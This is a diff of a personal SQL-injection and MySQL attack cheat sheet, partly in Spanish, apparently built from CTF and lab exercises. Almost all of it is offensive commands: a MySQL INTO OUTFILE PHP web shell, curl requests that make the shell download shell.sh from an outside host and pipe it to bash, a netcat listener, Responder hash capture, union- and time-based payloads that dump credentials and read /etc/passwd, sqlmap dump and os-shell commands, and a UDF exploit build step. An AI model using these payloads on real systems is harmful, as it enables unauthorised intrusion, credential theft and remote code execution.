@@ -3,68 +3,68 @@ https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/SQL.txt
 
 # con acceso a una BD podemos insertar codigo PHP para ganar RCE
 mysql>select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
-
-curl 192.168.100.1:8080/shell.php?cmd=whoami
-curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.155.7%3A8000%2Fshell.sh%7Cbash%20%26'
-
-A> sudo rlwrap nc -lvnp 53
-A> python3 -m http.server 8000
+at> curl 192.168.100.1:8080/shell.php?cmd=whoami
+at> curl http://192.168.100.1:8080/shell.php?cmd=curl http://10.50.155.7:8000/shell.sh | bash
 
 # mysql responder hash attack
 responder -I tun0
 1' union select 1,load_file('////IP_A/RECURSO'),1-- -
 john ntlmv2.hash --wordlists=diccionario
 
-# sqlite
-1'-- -
+# sqlinjection test
 admin'-- -
 admin' or '1'='1
-and 1 = 1
-and 2 = 1 union select 1,2,3
 
-1' order by 100-- -
+# sqli tipo error based
+# para encontrar cantidad de tablas
+order by 10
 
-union select 1,2,3,4;
-union select 1,2,3,database();
-union select 1,2,3,user();
-union select 1,2,3,load_file('/etc/passwd'); # test LFI
-union select 1,load_file('C://windows//system32/drivers/etc/hosts'),1 -- - # test LFI
-union select schema_name,2,3,4 from information_schema.schemata; **muestra todas las db**
+# para encontrar cantidad de columnas
+union select 1,2,3,database(); # consultado dbs
+union select 1,2,3,version(); # consultado version del motor
+union select 1,2,3,load_file('/etc/passwd'); # LFI
+union select 1,load_file('C://windows//system32/drivers/etc/hosts'),2 # LFI
 
-union select schema_name,2,3,4 from information_schema.schemata limit 1,1; **para forzar que muestre las db**
-union select 1,2,table_name,4 from information_schema.tables where table_schema = 'sqhell_5'; **tablas**
-union select 1,2,column_name,4 from information_schema.columns where table_schema = 'sqhell_5' and table_name = 'flag'; **columnas**
-union select 1,2,id,4 from sqhell_5.flag; **muestra el contenido de la tabla sqhell_5 la columna flag**
-union select 1,2,concat(id,0x3a,flag),4 from sqhell_5.flag;
+# inyectando consultas
+union select schema_name,2,3,4 from information_schema.schemata; # muestra las BDs
+union select schema_name,2,3,4 from information_schema.schemata limit 1,1; # para forzar que muestre las DBs
 
-searchitem=test%27+UNION+SELECT+1,2,DATABASE()+--+-
-searchitem=test%27+UNION+SELECT+1,2,VERSION()+--+-
-searchitem=test%27+UNION+SELECT+1,2,SCHEMA_NAME+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+1,4+--+-
-searcitem=test%27+UNION+SELECT+1,2,COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA=+'db'+AND+TABLE_NAME+=+'users'--+-
-searchitem=test%27+UNION+SELECT+1,2,CONCAT(username,0x3a,pwd)+FROM+db.users--+-
+# tablas
+union select table_name,2,3,4 from information_schema.tables where table_schema = 'sqhell_5';
 
-https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like '%';--
-https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password like '%';--
-https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password like '4961';--
+# columnas
+union select 1,2,column_name,4 from information_schema.columns where table_schema = 'sqhell_5' and table_name = 'flag';
+
+# campos 
+union select 1,2,id,4 from sqhell_5.flag; # muestra el contenido de la tabla 
+union select 1,2,concat(id,0x3a,flag),4 from sqhell_5.flag; # muestra campos especificos
+
+# sqli tipo time based
+UNION SELECT SLEEP(2),2 FROM information_schema.columns WHERE table_schema ='sqli_four' and table_name = 'users' and column_name like '%';--
+UNION SELECT SLEEP(2),2 from users where username='admin' and password like '%';--
+UNION SELECT SLEEP(2),2 from users where username='admin' and password like '4961';--
 
 # mysql beautify output
 mysql> select * from wp-user\G
 
 # mysql-tools
 mysqlshow -u USER -p PASS DATABASE TABLES
+
 mysqldump -u USER --password=PASS --single-transaction --all-databases
 mysqldump -u USER --password=PASS --no-data TABLES
 mysqldump -u root -p Password123! --all-databases > all_db_backup.sql
 
 # sqlmap
-sqlmap.py -u URL --method POST --data "username=FUZZ&password=" -P username --dbs --dbms mysql --level 2
-sqlmap.py -u "http://ip/register/user-check?username=admin" --dbms mysql -D database -T flag --dump
-sqlmap -r request.txt --dbms=mysql --dump
-sqlmap -r lockdown.req --dbms=mysql --dump -T 'users' -D 'cts_db' -C 'username,password'
-sqlmap -u "http://192.168.1.100/section.php" --data "id=50&pass=1234" --dbs --threads 10 
-sqlmap -u "http://192.168.1.100/section.php?id=51" --sql-query="select * from users"
+sqlmap.py -u URL --method POST --data "username=FUZZ&password=" -P username --dbs --dbms mysql --level 2 --threads 10 
 sqlmap -u 'http://10.129.154.173/dashboard.php?search=1' --level 3 --dbms 'oracle' --dump-all --batch
 sqlmap -u 'http://10.129.154.173/dashboard.php?search=1' --cookie="PHPSESSID=gjfbgkutlm9q1vtavt2gmi00ne" --os-shell --flush-session
+
+sqlmap.py -u "http://ip/register/user-check?username=admin" --dbms mysql -D database -T flag --dump-all --batch
+
+sqlmap -r lockdown.req --dbms=mysql --dump -T 'users' -D 'cts_db' -C 'username,password'
+
+sqlmap -u "http://192.168.1.100/section.php" --data "id=50&pass=1234" --dbs --threads 10 
+sqlmap -u "http://192.168.1.100/section.php?id=51" --sql-query="select * from users"
 
 # mysql (UDFs exploit):
 gcc -g -c raptor_udf2.c -fPIC
